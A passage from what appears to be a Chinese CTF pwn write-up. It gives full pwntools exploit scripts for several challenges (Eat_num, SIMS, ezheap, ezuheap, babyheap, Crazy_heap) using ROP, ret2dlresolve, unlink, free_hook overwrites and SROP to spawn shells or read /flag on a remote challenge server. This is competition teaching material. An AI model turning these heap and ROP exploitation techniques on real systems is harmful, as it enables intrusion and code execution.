payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>)+p64(can)+p64(stack+<span class="hljs-number">0x10</span>-<span class="hljs-number">8</span>)+p64(leave_ret)
payload += <span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span> <span class="hljs-comment"># </span>
payload += p64(pop_rdi)
payload += p64(stack+<span class="hljs-number">8</span>)
payload += p64(pop_rsi)
payload += p64(<span class="hljs-number">0</span>)
payload += p64(open_addr)
payload += p64(pop_rdi)
payload += p64(<span class="hljs-number">3</span>)
payload += p64(pop_rsi)
payload += p64(<span class="hljs-number">0x601060</span>+<span class="hljs-number">0x100</span>)
payload += p64(pop_rdx)
payload += p64(<span class="hljs-number">0x100</span>)
payload += p64(read_addr)
payload += p64(pop_rdi)
payload += p64(<span class="hljs-number">1</span>)
payload += p64(pop_rsi)
payload += p64(<span class="hljs-number">0x601060</span>+<span class="hljs-number">0x100</span>)
payload += p64(pop_rdx)
payload += p64(<span class="hljs-number">0x100</span>)
payload += p64(write_addr)
<span class="hljs-comment">#bug()</span>
p.send(payload)

p.interactive()</code></pre>
<h2 id="Eat-num"><a href="#Eat-num" class="headerlink" title="Eat_num"></a>Eat_num</h2><p>下载附件分析，有溢出漏洞，利用做题模板写脚本，运行得到flag。<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> roputils <span class="hljs-keyword">import</span> *

fpath = <span class="hljs-string">&#x27;./attachment-38&#x27;</span>
offset = <span class="hljs-number">72</span>

rop = ROP(fpath)
addr_bss = rop.section(<span class="hljs-string">&#x27;.bss&#x27;</span>)

buf = rop.retfill(offset)
buf += rop.call(<span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-number">0</span>, addr_bss, <span class="hljs-number">100</span>)
buf += rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)

p = Proc(host=<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,port=<span class="hljs-number">10067</span>)

p.write(p32(<span class="hljs-built_in">len</span>(buf)) + buf)
<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] read: %r&quot;</span> % p.read(<span class="hljs-built_in">len</span>(buf))

buf = rop.string(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)
buf += rop.fill(<span class="hljs-number">20</span>, buf)
buf += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">&#x27;system&#x27;</span>)
buf += rop.fill(<span class="hljs-number">100</span>, buf)

p.write(buf)
p.interact(<span class="hljs-number">0</span>)</code></pre>
<h2 id="SIMS"><a href="#SIMS" class="headerlink" title="SIMS"></a>SIMS</h2><p>分析主函数，是一道有UAF的堆漏洞题目，用做题模板写脚本得到flag。<br>exp：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
context.arch=<span class="hljs-string">&quot;amd64&quot;</span>
<span class="hljs-comment">#context.arch=&quot;i386&quot;</span>
context.os=<span class="hljs-string">&quot;linux&quot;</span>
context.log_level=<span class="hljs-string">&quot;debug&quot;</span>
elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
io=<span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> io==<span class="hljs-number">0</span>:
p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
<span class="hljs-keyword">else</span>:
p=remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10085</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():
gdb.attach(p)
pause()
p.sendlineafter(<span class="hljs-string">b&#x27;welcome~ please input the password:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2118602923</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Age of Stu:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,pay</span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
p.sendlineafter(<span class="hljs-string">b&#x27;Content of Stu:\n&#x27;</span>,pay)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
add(<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">0x450</span>)
add(<span class="hljs-number">0x10</span>)
dele(<span class="hljs-number">1</span>)
show(<span class="hljs-number">1</span>)
libc_base=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x3EBC40</span>
add(<span class="hljs-number">0x450</span>)
heaparray=<span class="hljs-number">0x602160</span>
fd=heaparray-<span class="hljs-number">0x18</span>
bk=heaparray-<span class="hljs-number">0x10</span>
pay=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>)+p64(fd)+p64(bk)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x460</span>)
edit(<span class="hljs-number">0</span>,pay)
dele(<span class="hljs-number">1</span>)
edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))
edit(<span class="hljs-number">0</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))
edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
dele(<span class="hljs-number">2</span>)
success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(libc_base)))
<span class="hljs-comment"># dbg()</span>
p.interactive()</code></pre>
<h2 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h2><p>查看主函数，有堆漏洞<br><img src="https://img-blog.csdnimg.cn/3597b476753e41b6a4411fd8ae2a0cd9.png" alt="在这里插入图片描述"><br>在bk指针处写 个地址,然后再用unsort时会在那个地址上写个堆地址.这样就达到后门条件了，利用后门写exp得到flag<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64

<span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):
    p.send(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):
    p.sendafter(a, b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):
    p.sendline(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):
    p.sendlineafter(a,b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():
    p.recv()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():
    <span class="hljs-built_in">print</span>(p.recv())
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):
    <span class="hljs-keyword">return</span> p.recvuntil(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():
    p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():
    gdb.attach(p)
    pause()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():
    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
<span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span>
p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>, <span class="hljs-number">10005</span>)
elf = ELF(<span class="hljs-string">&#x27;./pwn35&#x27;</span>)
libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)
<span class="hljs-comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):
   sla(<span class="hljs-string">&quot;input your choice : &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   sla(<span class="hljs-string">&quot;input idx plz : &quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sla(<span class="hljs-string">&quot;input size plz : &quot;</span>,<span class="hljs-built_in">str</span>(size))
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
   sla(<span class="hljs-string">&quot;input your choice : &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   sla(<span class="hljs-string">&quot;input idx plz : &quot;</span>,<span class="hljs-built_in">str</span>(idx))
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
   sla(<span class="hljs-string">&quot;input your choice : &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   sla(<span class="hljs-string">&quot;input idx plz : &quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sla(<span class="hljs-string">&quot;input content plz : &quot;</span>,content)
   
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x138</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x108</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x108</span>)
delete(<span class="hljs-number">0</span>)
addr=<span class="hljs-number">0x6029a8</span>
edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(addr))
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x138</span>)
p.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)
sleep(<span class="hljs-number">1</span>)
p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x4009aa</span>))
p.interactive()</code></pre>
<h2 id="ezuheap"><a href="#ezuheap" class="headerlink" title="ezuheap"></a>ezuheap</h2><p>题目给出了gift异或得到加载地址,然后show指针前溢出得到stdout的地址<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
<span class="hljs-comment">#io=process(&quot;./uheap&quot;)</span>
io=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10006</span>)
elf=ELF(<span class="hljs-string">&quot;./uheap&quot;</span>)
r = <span class="hljs-keyword">lambda</span> : io.recv()
rx = <span class="hljs-keyword">lambda</span> x: io.recv(x)
ru = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x)
rud = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x, drop=<span class="hljs-literal">True</span>)
uu64= <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
s = <span class="hljs-keyword">lambda</span> x: io.send(x)
sl = <span class="hljs-keyword">lambda</span> x: io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
shell = <span class="hljs-keyword">lambda</span> : io.interactive()
<span class="hljs-comment">#libc=elf.libc</span>
libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,length</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sla(<span class="hljs-string">&quot;len:&quot;</span>,<span class="hljs-built_in">str</span>(length))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sl(content)
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
   
<span class="hljs-comment">#gdb.attach(io)</span>
sl(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
pause()
sl(<span class="hljs-string">b&#x27;365303148&#x27;</span>)
ru(<span class="hljs-string">&quot;first gift: 0x&quot;</span>)
first_gift=<span class="hljs-built_in">int</span>(rx(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)
ru(<span class="hljs-string">&quot;second gift: 0x&quot;</span>)
second_gift=<span class="hljs-built_in">int</span>(rx(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)^first_gift
first_gift^=<span class="hljs-number">0x15C6156C</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(first_gift))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(second_gift))
ptr=second_gift-<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">4</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):
   delete(<span class="hljs-number">2</span>)
   edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;aaaaaaaaaaaa&#x27;</span>)

delete(<span class="hljs-number">2</span>)
show(<span class="hljs-number">2</span>)
leak_addr=uu64()
main_arena=leak_addr-<span class="hljs-number">96</span>
malloc_hook=main_arena-<span class="hljs-number">0x10</span>
libc_base = malloc_hook - libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))
delete(<span class="hljs-number">5</span>)
edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x110</span>))
edit(<span class="hljs-number">1</span>,(p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)))
delete(<span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ptr))
edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(free_hook))
edit(<span class="hljs-number">1</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))
edit(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))
delete(<span class="hljs-number">5</span>)
shell()</code></pre>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>查看主函数有UAF后门，利用这个UAF造重叠块,最后一点点把payload写到free_hook。<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;error&#x27;</span>) 
<span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span>
p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>, <span class="hljs-number">10030</span>)
libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>) 
menu = <span class="hljs-string">b&quot;plz input choice: &quot;</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">msg</span>):
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;1&#x27;</span>)
    p.sendafter(<span class="hljs-string">b&quot;plz input content: &quot;</span>, msg)
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;2&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&quot;plz input idx: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;3&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&quot;plz input idx: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">free2</span>(<span class="hljs-params">idx</span>):  <span class="hljs-comment"># UAF</span>
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;2023&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&quot;plz input idx: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):
    add(<span class="hljs-string">b&#x27;A&#x27;</span>)
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>]:
    free(i)
free(<span class="hljs-number">5</span>)
free2(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
heap = u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x190</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;heap = :x&#125;</span>&quot;</span>)
free(<span class="hljs-number">4</span>)
free(<span class="hljs-number">0</span>)
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]:
    add(<span class="hljs-string">b&#x27;B&#x27;</span>)
add(p64(heap+<span class="hljs-number">0x50</span>)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0x51</span>))
add(<span class="hljs-string">b&#x27;C&#x27;</span>)
add(<span class="hljs-string">b&#x27;C&#x27;</span>)
add(flat(<span class="hljs-number">0x101</span>, <span class="hljs-number">0x461</span>))
free(<span class="hljs-number">1</span>)
add(<span class="hljs-string">b&#x27;AAA&#x27;</span>)
show(<span class="hljs-number">2</span>)
libc.address = u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;libc.address = :x&#125;</span>&quot;</span>)
free_hook   = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
_environ    = libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]
setcontext  = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]
syscall     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall; ret&quot;</span>)))
pop_rdi     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdi; ret&quot;</span>)))
pop_rsi     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rsi; ret&quot;</span>)))
pop_rdx_r12 = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdx; pop r12; ret&quot;</span>)))
pop_rax     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rax; ret&quot;</span>)))
jmp_rsp     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;jmp rsp&quot;</span>)))
 
<span class="hljs-comment">#gadget</span>
gadget_addr= libc.address + <span class="hljs-number">0x0000000000151990</span>
 
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">.text:0000000000151990 48 8B 57 08                   mov     rdx, [rdi+8]</span>
<span class="hljs-string">.text:0000000000151994 48 89 04 24                   mov     [rsp+0C8h+var_C8], rax</span>
<span class="hljs-string">.text:0000000000151998 FF 52 20                      call    qword ptr [rdx+20h]</span>
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-comment">#orw</span>
fake_frame_addr = free_hook + <span class="hljs-number">0x10</span>
frame = SigreturnFrame()
frame.rax = <span class="hljs-number">0</span>
frame.rdi = fake_frame_addr + <span class="hljs-number">0xF8</span>
frame.rsp = fake_frame_addr + <span class="hljs-number">0xF8</span> + <span class="hljs-number">0x10</span>
frame.rip = pop_rdi + <span class="hljs-number">1</span>  <span class="hljs-comment"># : ret</span>
 
rop_data = [
    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],
    pop_rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,pop_rdi,<span class="hljs-number">3</span>,pop_rsi,fake_frame_addr + <span class="hljs-number">0x200</span>,libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],
    pop_rdi,fake_frame_addr + <span class="hljs-number">0x200</span>,libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]
    ]
 
frame_data = flat(frame).ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
payload = flat(gadget_addr,fake_frame_addr,frame_data[:<span class="hljs-number">0x20</span>],setcontext+<span class="hljs-number">61</span>,frame_data[<span class="hljs-number">0x28</span>:],<span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>),<span class="hljs-number">0</span>)+flat(rop_data)
 
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;len(payload)&#x27;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload[<span class="hljs-number">0xf8</span>:])))
<span class="hljs-comment">#save payload to __free_hook</span>
offset  = <span class="hljs-number">0</span>
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
free(<span class="hljs-number">13</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">12</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">11</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">10</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">9</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">8</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook , heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[<span class="hljs-number">0</span>: <span class="hljs-number">0x40</span>])  
 
free(<span class="hljs-number">8</span>)
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
 
p.recvline()
p.recvline()
p.recvline()
p.interactive()</code></pre>
<h2 id="Crazy-heap"><a href="#Crazy-heap" class="headerlink" title="Crazy_heap"></a>Crazy_heap</h2><p>下载题目附件，查看主函数，有堆相关的漏洞，利用模板写解题脚本。<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.arch=<span class="hljs-string">&quot;amd64&quot;</span>
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
p=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10032</span>)
elf=ELF(<span class="hljs-string">&quot;./my_heap&quot;</span>)
libc=ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;length:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   p.sendlineafter(<span class="hljs-string">&quot;name:&quot;</span>,b)
   p.sendlineafter(<span class="hljs-string">&quot;girl\n&quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">a,b</span>):
